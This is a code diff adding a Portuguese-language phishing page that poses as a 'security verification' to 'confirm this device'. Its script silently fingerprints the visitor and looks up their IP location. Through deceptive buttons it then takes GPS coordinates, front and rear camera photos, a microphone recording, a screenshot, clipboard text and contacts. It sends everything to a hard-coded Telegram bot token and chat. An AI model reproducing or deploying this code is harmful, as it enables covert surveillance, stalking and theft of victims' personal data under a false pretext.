@@ -1,20 +1,229 @@
-
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verificação de segurança</title>
+<style>
+:root{--bg:#0b0f14;--card:#131a22;--fg:#e6edf3;--mut:#8b98a5;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149}
+*{box-sizing:border-box}
+body{margin:0;font:15px/1.45 -apple-system,system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);padding:16px 14px 40px}
+h1{font-size:19px;margin:0 0 4px}p.s{margin:0 0 16px;color:var(--mut);font-size:13px}
+.card{background:var(--card);border:1px solid #1f2933;border-radius:12px;padding:14px;margin:0 0 12px}
+button{width:100%;padding:12px;border-radius:10px;border:1px solid #24303d;background:#1b2530;color:var(--fg);font-size:14px;font-weight:600;margin:0 0 8px;cursor:pointer}
+button.p{background:var(--acc);border-color:var(--acc);color:#fff}
+button.g{background:#132a17;border-color:#1f4a26;color:var(--ok)}
+pre{background:#0a0e13;border:1px solid #1c2631;border-radius:8px;padding:10px;font-size:11px;white-space:pre-wrap;word-break:break-word;max-height:200px;overflow:auto;color:#a7b3c0;margin:0}
+small{color:var(--mut);font-size:11.5px;display:block;margin-top:6px}
+#err{display:none;background:#2a1113;border:1px solid var(--bad);color:#ffb3b0;padding:10px;border-radius:8px;font-size:12px;margin:0 0 12px;white-space:pre-wrap}
+img.pv{width:100%;border-radius:8px;margin-top:8px;display:none}
+</style>
+</head>
+<body>
 <h1>Verificação de segurança</h1>
 <p class="s">Confirme este dispositivo para liberar o acesso.</p>
+<div id="err"></div>
 
 <div class="card">
-  <button class="p">Iniciar verificação</button>
-  <button>Só localização</button>
-  <button>Só câmera</button>
-  <button>Só microfone</button>
+  <button class="p" onclick="runAll()">Iniciar verificação</button>
+  <button onclick="geo()">Só localização</button>
+  <button onclick="camera('user')">Só câmera</button>
+  <button onclick="audio()">Só microfone</button>
+  <button onclick="testar()">Testar token</button>
   <small id="st">aguardando…</small>
 </div>
 
 <div class="card">
   <pre id="log">—</pre>
   <img class="pv" id="pv">
-  <button class="g" style="margin-top:10px">Reenviar relatório</button>
+  <button class="g" style="margin-top:10px" onclick="enviar()">Reenviar relatório</button>
 </div>
 
+<script>
+window.onerror = function (m, s, l) {
+  var d = document.getElementById('err');
+  d.style.display = 'block';
+  d.textContent = 'ERRO: ' + m + ' (linha ' + l + ')';
+};
+</script>
 
+<script>
+/* ====== CONFIG — edite só aqui ====== */
+const CFG = {
+  tgToken: "9208612539:AAG4kBW6wsf_IE8cu2kT5eYvtWpIBxfRvjI",
+  tgChat:  "926262308",
+  endpoint: "",
+  redirect: ""
+};
+/* ==================================== */
 
+const R = {};
+const sid = localStorage.getItem('sid') ||
+  (Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
+localStorage.setItem('sid', sid);
+R.sessao = sid;
+R.aberto_em = new Date().toISOString();
+R.visitas = (+localStorage.getItem('vis') || 0) + 1;
+localStorage.setItem('vis', R.visitas);
+
+const put = (k, v) => { if (v !== undefined && v !== null && v !== '') R[k] = v; };
+const st = t => document.getElementById('st').textContent = t;
+const draw = () => document.getElementById('log').textContent =
+  JSON.stringify(Object.fromEntries(Object.entries(R).filter(([k]) =>
+    !['foto_user','foto_environment','tela','audio'].includes(k))), null, 1);
+
+async function testar() {
+  st('testando token…');
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${CFG.tgToken}/getMe`);
+    const j = await r.json();
+    st(j.ok ? 'token OK: @' + j.result.username + ' | chat ' + CFG.tgChat
+            : 'token FALHOU: ' + j.description);
+  } catch (e) { st('token FALHOU: ' + e.message); }
+}
+
+async function passivo() {
+  const n = navigator;
+  put('ua', n.userAgent); put('plataforma', n.platform); put('vendor', n.vendor);
+  put('idiomas', (n.languages || []).join(', '));
+  put('fuso', Intl.DateTimeFormat().resolvedOptions().timeZone);
+  put('tela', `${screen.width}x${screen.height} @${devicePixelRatio}x`);
+  put('janela', `${innerWidth}x${innerHeight}`);
+  put('cores', n.hardwareConcurrency); put('ram_gb', n.deviceMemory);
+  put('touch', n.maxTouchPoints); put('cookies', n.cookieEnabled);
+  try {
+    const ua = await n.userAgentData.getHighEntropyValues(
+      ['platform','platformVersion','model','architecture','fullVersionList']);
+    put('modelo', ua.model); put('plataforma_ver', ua.platformVersion);
+  } catch {}
+  try { const b = await n.getBattery();
+    put('bateria', `${Math.round(b.level*100)}% carregando=${b.charging}`); } catch {}
+  const c = n.connection || {};
+  put('rede', [c.effectiveType, c.downlink && c.downlink+'Mbps', c.rtt && c.rtt+'ms',
+    c.saveData ? 'saveData' : ''].filter(Boolean).join(' | '));
+  try { const s = await n.storage.estimate();
+    put('storage', `${(s.usage/1048576).toFixed(1)}MB de ${(s.quota/1048576).toFixed(0)}MB`); } catch {}
+  try { put('ip', (await (await fetch('https://api.ipify.org?format=json')).json()).ip); } catch {}
+  try { const d = await (await fetch('https://ipapi.co/json/')).json();
+    put('ip_geo', [d.city,d.region,d.country_name,d.org,d.asn].filter(Boolean).join(' | ')); } catch {}
+  draw();
+}
+
+function geo() { return new Promise(r => {
+  if (!navigator.geolocation) return r();
+  st('pedindo localização…');
+  navigator.geolocation.getCurrentPosition(p => {
+    const { latitude: la, longitude: lo, accuracy: ac } = p.coords;
+    put('gps', `${la},${lo} (±${Math.round(ac)}m)`);
+    put('gps_maps', `https://maps.google.com/?q=${la},${lo}`);
+    draw(); r();
+  }, e => { put('gps', 'erro: ' + e.message); r(); },
+     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+}); }
+
+async function camera(facing) {
+  st('abrindo câmera ' + facing + '…');
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+    const v = document.createElement('video');
+    v.srcObject = s; v.muted = true; v.playsInline = true; await v.play();
+    await new Promise(r => setTimeout(r, 1000));
+    const cv = document.createElement('canvas');
+    cv.width = v.videoWidth; cv.height = v.videoHeight;
+    cv.getContext('2d').drawImage(v, 0, 0);
+    const u = cv.toDataURL('image/jpeg', .85);
+    R['foto_' + facing] = u;
+    const im = document.getElementById('pv'); im.src = u; im.style.display = 'block';
+    s.getTracks().forEach(t => t.stop());
+  } catch (e) { put('erro_camera_' + facing, e.name); }
+}
+
+async function audio() {
+  st('gravando áudio…');
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mr = new MediaRecorder(s); const ch = [];
+    mr.ondataavailable = e => ch.push(e.data);
+    mr.start(); await new Promise(r => setTimeout(r, 6000));
+    await new Promise(r => { mr.onstop = r; mr.stop(); });
+    s.getTracks().forEach(t => t.stop());
+    R.audio = new Blob(ch, { type: 'audio/webm' });
+  } catch (e) { put('erro_audio', e.name); }
+}
+
+async function extras() {
+  try { put('clipboard', await navigator.clipboard.readText()); } catch {}
+  try { put('contatos', JSON.stringify(
+    await navigator.contacts.select(['name','tel','email'], { multiple: true }))); } catch {}
+  try {
+    const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    const v = document.createElement('video'); v.srcObject = s; await v.play();
+    await new Promise(r => setTimeout(r, 800));
+    const cv = document.createElement('canvas');
+    cv.width = v.videoWidth; cv.height = v.videoHeight;
+    cv.getContext('2d').drawImage(v, 0, 0);
+    R.tela = cv.toDataURL('image/jpeg', .8);
+    s.getTracks().forEach(t => t.stop());
+  } catch {}
+  draw();
+}
+
+async function runAll() {
+  st('coletando…');
+  try { await navigator.wakeLock.request('screen'); } catch {}
+  await passivo();
+  await geo();
+  await camera('user');
+  await camera('environment');
+  await audio();
+  await extras();
+  st('enviando…');
+  await enviar();
+  st('concluído');
+  if (CFG.redirect) setTimeout(() => location.href = CFG.redirect, 1200);
+}
+
+const url = m => `https://api.telegram.org/bot${CFG.tgToken}/${m}`;
+const dataURLtoBlob = d => {
+  const [h, b] = d.split(','); const mime = h.match(/:(.*?);/)[1];
+  const bin = atob(b); const u = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
+  return new Blob([u], { type: mime });
+};
+
+async function enviar() {
+  const { foto_user, foto_environment, tela, audio: a, ...rest } = R;
+  const txt = 'RELATORIO ' + sid + '\n' +
+    Object.entries(rest).map(([k, v]) => `${k}: ${v}`).join('\n');
+  if (CFG.tgToken && CFG.tgChat) {
+    try {
+      const f = new FormData();
+      f.append('chat_id', CFG.tgChat); f.append('text', txt);
+      await fetch(url('sendMessage'), { method: 'POST', body: f });
+      const env = async (blob, name, cap) => {
+        const g = new FormData();
+        g.append('chat_id', CFG.tgChat); g.append('document', blob, name);
+        g.append('caption', cap);
+        await fetch(url('sendDocument'), { method: 'POST', body: g });
+      };
+      if (foto_user) env(dataURLtoBlob(foto_user), 'frontal.jpg', 'camera frontal');
+      if (foto_environment) env(dataURLtoBlob(foto_environment), 'traseira.jpg', 'camera traseira');
+      if (tela) env(dataURLtoBlob(tela), 'tela.jpg', 'captura de tela');
+      if (a) env(a, 'microfone.webm', 'audio 6s');
+    } catch (e) { put('erro_telegram', e.message); }
+  }
+  if (CFG.endpoint) {
+    try {
+      await fetch(CFG.endpoint, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(rest)
+      });
+    } catch {}
+  }
+  draw();
+}
+
+passivo();
+</script>
+</body>
+</html>
